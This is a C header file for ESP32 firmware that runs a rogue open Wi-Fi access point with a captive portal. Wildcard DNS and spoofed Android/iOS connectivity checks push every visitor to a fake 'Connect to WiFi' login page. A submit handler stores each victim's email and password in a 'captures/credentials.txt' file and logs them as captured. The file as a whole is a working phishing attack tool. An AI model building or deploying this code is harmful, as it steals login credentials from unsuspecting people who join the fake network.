#ifndef WIFI_PORTAL_H
#define WIFI_PORTAL_H

#include <stdint.h>
#include <string.h>
#include <sys/param.h>
#include <sys/stat.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "esp_spiffs.h"
#include "nvs_flash.h"
#include "lwip/inet.h"
#include "dns_server.h"
#include "esp_mac.h"
static const char *PORTAL_TAG = "Portal";
static httpd_handle_t portal_server = NULL;
static dns_server_handle_t dns_server = NULL;
static char portal_ssid[33] = {0};
static uint8_t portal_running = 0;

extern const char portal_html_start[] asm("_binary_portal_html_start");
extern const char portal_html_end[] asm("_binary_portal_html_end");

static void portal_wifi_event_handler(void *arg, esp_event_base_t event_base,
                                      int32_t event_id, void *event_data) {
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        ESP_LOGI(PORTAL_TAG, "Station connected: " MACSTR, MAC2STR(event->mac));
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(PORTAL_TAG, "Station disconnected: " MACSTR, MAC2STR(event->mac));
    }
}
static esp_err_t portal_detect_handler(httpd_req_t *req) {
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_type(req, "text/html");
    const char *html = "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1'></head></html>";
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static const httpd_uri_t portal_detect1 = {
    .uri = "/generate_204",
    .method = HTTP_GET,
    .handler = portal_detect_handler
};

static const httpd_uri_t portal_detect2 = {
    .uri = "/gen_204",
    .method = HTTP_GET,
    .handler = portal_detect_handler
};
static esp_err_t portal_page_handler(httpd_req_t *req) {
    ESP_LOGI(PORTAL_TAG, "Serving portal page");
    
    FILE *f = fopen("/spiffs/sites/portal.html", "r");
    if (f) {
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz > 0 && sz < 32768) {
            char *html = malloc(sz + 1);
            if (html) {
                size_t rd = fread(html, 1, sz, f);
                html[rd] = 0;
                fclose(f);
                httpd_resp_set_type(req, "text/html");
                httpd_resp_send(req, html, rd);
                free(html);
                return ESP_OK;
            }
        }
        fclose(f);
    }

    const char *fb =
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>WiFi Login</title><style>"
        "body{font-family:-apple-system,sans-serif;max-width:400px;margin:50px auto;padding:20px;background:#f5f5f5}"
        "h2{text-align:center}input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:6px;font-size:16px}"
        "button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;border-radius:6px;font-size:16px}"
        ".c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
        "</style></head><body><div class='c'><h2>Connect to WiFi</h2>"
        "<form method='POST' action='/submit'>"
        "<input name='email' placeholder='Email' required>"
        "<input type='password' name='password' placeholder='Password' required>"
        "<button type='submit'>Connect</button></form></div></body></html>";
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, fb, strlen(fb));
    return ESP_OK;
}

static esp_err_t portal_submit_handler(httpd_req_t *req) {
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    buf[ret] = 0;

    char email[128] = {0}, password[128] = {0};
    char *p;
    if ((p = strstr(buf, "email=")) != NULL) {
        p += 6;
        char *e = strchr(p, '&');
        if (!e) e = p + strlen(p);
        int l = e - p;
        if (l > 127) l = 127;
        strncpy(email, p, l);
    }
    if ((p = strstr(buf, "password=")) != NULL) {
        p += 9;
        char *e = strchr(p, '&');
        if (!e) e = p + strlen(p);
        int l = e - p;
        if (l > 127) l = 127;
        strncpy(password, p, l);
    }

    mkdir("/spiffs/captures", 0755);
    FILE *f = fopen("/spiffs/captures/credentials.txt", "a");
    if (f) {
        fprintf(f, "SSID: %s\nEmail: %s\nPassword: %s\n---\n", portal_ssid, email, password);
        fclose(f);
        ESP_LOGI(PORTAL_TAG, "Captured: %s / %s", email, password);
    }

    const char *resp =
        "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
        "<h2>Connecting...</h2><p>Please wait.</p>"
        "<script>setTimeout(function(){window.location='/';},3000);</script></body></html>";
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, resp, strlen(resp));
    return ESP_OK;
}

static esp_err_t portal_404_handler(httpd_req_t *req, httpd_err_code_t err) {
    ESP_LOGI(PORTAL_TAG, "Redirecting 404: %s", req->uri);
    
    // For Android captive portal detection
    if (strstr(req->uri, "generate_204") || strstr(req->uri, "gen_204") ||
        strstr(req->uri, "connectivitycheck") || strstr(req->uri, "connectivity-check")) {
        // Return 200 with content (not 204) to trigger portal
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/html");
        const char *redirect = "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1'></head></html>";
        httpd_resp_send(req, redirect, strlen(redirect));
        return ESP_OK;
    }
    
    // Standard 303 redirect for everything else
    httpd_resp_set_status(req, "303 See Other");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1");
    // iOS needs content in response
    httpd_resp_send(req, "Redirect to the captive portal", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static const httpd_uri_t portal_root = {
    .uri = "/",
    .method = HTTP_GET,
    .handler = portal_page_handler
};

static const httpd_uri_t portal_submit = {
    .uri = "/submit",
    .method = HTTP_POST,
    .handler = portal_submit_handler
};

static httpd_handle_t portal_start_webserver(void) {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_open_sockets = 7;
    config.lru_purge_enable = true;

    ESP_LOGI(PORTAL_TAG, "Starting HTTP server on port: %d", config.server_port);
    if (httpd_start(&server, &config) == ESP_OK) {
        ESP_LOGI(PORTAL_TAG, "Registering URI handlers");
        httpd_register_uri_handler(server, &portal_root);
        httpd_register_uri_handler(server, &portal_submit);
httpd_register_uri_handler(server, &portal_detect1);
httpd_register_uri_handler(server, &portal_detect2);
        httpd_register_err_handler(server, HTTPD_404_NOT_FOUND, portal_404_handler);
    }
    return server;
}

static inline uint8_t portal_start(const char *ssid) {
    if (portal_running) return 0;

    strncpy(portal_ssid, ssid, 32);
    portal_ssid[32] = 0;

    esp_log_level_set("httpd_uri", ESP_LOG_ERROR);
    esp_log_level_set("httpd_txrx", ESP_LOG_ERROR);
    esp_log_level_set("httpd_parse", ESP_LOG_ERROR);

    // Check if already initialized
    esp_err_t err;
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(err);
    }
    
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(err);
    }
    
    err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        err = nvs_flash_init();
    }
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(err);
    }

    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_wifi_event_handler, NULL));

    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = strlen(ssid),
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .channel = 6,
            .beacon_interval = 100,
        },
    };
    strncpy((char *)wifi_config.ap.ssid, ssid, 32);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"), &ip_info);
    char ip_addr[16];
    inet_ntoa_r(ip_info.ip.addr, ip_addr, 16);
    ESP_LOGI(PORTAL_TAG, "AP started: %s with IP: %s", ssid, ip_addr);

    esp_vfs_spiffs_conf_t sc = {
        .base_path = "/spiffs",
        .partition_label = NULL,
        .max_files = 5,
        .format_if_mount_failed = true
    };
    err = esp_vfs_spiffs_register(&sc);
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE)
        ESP_LOGW(PORTAL_TAG, "SPIFFS: %s", esp_err_to_name(err));
    mkdir("/spiffs/sites", 0755);
    mkdir("/spiffs/captures", 0755);

    portal_server = portal_start_webserver();

    dns_server_config_t dns_config = DNS_SERVER_CONFIG_SINGLE("*", "WIFI_AP_DEF");
    dns_server = start_dns_server(&dns_config);

    ESP_LOGI(PORTAL_TAG, "Portal active");
    portal_running = 1;
    return 1;
}

static inline void portal_stop(void) {
    if (!portal_running) return;

    if (dns_server) {
        stop_dns_server(dns_server);
        dns_server = NULL;
    }

    if (portal_server) {
        httpd_stop(portal_server);
        portal_server = NULL;
    }

    esp_wifi_stop();
    portal_running = 0;
    ESP_LOGI(PORTAL_TAG, "Portal stopped");
}

static inline uint8_t portal_is_running(void) {
    return portal_running;
}

#endif
